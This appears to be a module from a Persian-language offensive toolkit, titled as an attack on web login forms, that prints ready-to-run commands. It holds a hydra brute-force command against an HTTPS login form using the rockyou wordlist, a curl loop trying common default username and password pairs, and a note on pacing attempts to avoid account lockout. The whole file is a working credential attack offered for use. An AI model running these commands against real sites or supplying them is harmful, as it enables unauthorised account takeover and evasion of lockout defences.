DESC="حمله به فرم لاگین (بروت‌فورس و بایپس)"
REQ="hydra"
RISK="HIGH"
NOTE="۳ تلاش، ۳۰ دقیقه استراحت. وگرنه lockout"

termux(){ echo "hydra -L u.txt -P p.txt <TARGET> https-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'"; }

kali(){
cat <<'EOF'
# فرم را با devtools بگیر، سپس:
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET> \
  https-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# کاربر پیش‌فرض:
for u in admin administrator root test user; do
  for p in admin password 123456 admin123; do
    code=$(curl -s -o /dev/null -w '%{http_code}' -d "username=$u&password=$p" https://<TARGET>/login)
    echo "$u:$p -> $code"
  done
done
EOF
}
